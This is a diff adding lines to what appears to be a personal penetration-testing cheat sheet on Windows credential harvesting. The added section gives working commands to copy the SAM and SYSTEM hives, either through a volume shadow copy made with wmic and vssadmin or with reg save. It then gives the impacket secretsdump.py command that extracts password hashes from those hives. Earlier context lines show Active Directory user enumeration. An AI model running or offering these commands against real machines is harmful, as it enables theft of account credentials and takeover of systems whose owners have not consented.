@@ -337,3 +337,14 @@
           Memory Dump
           Active Directory  
             Get-ADUser -Filter * -Properties * | select Name,SamAccountName,Description  //in the description
+        FROM LOCAL windows
+          //copy SAM and SYSTEM , SAM is the credential, system is the key
+          1.  wmic shadowcopy call create Volume='C:\'
+              vssadmin list shadows
+              copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\users\Administrator\Desktop\sam    //use volume shadow
+              copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system C:\users\Administrator\Desktop\system
+          2. reg save HKLM\sam C:\users\Administrator\Desktop\sam-reg   //use register
+            reg save HKLM\system C:\users\Administrator\Desktop\system-reg
+          3. use .py to decypted
+            python3.9 /opt/impacket/examples/secretsdump.py -sam /tmp/sam-reg -system /tmp/system-reg LOCAL
+          
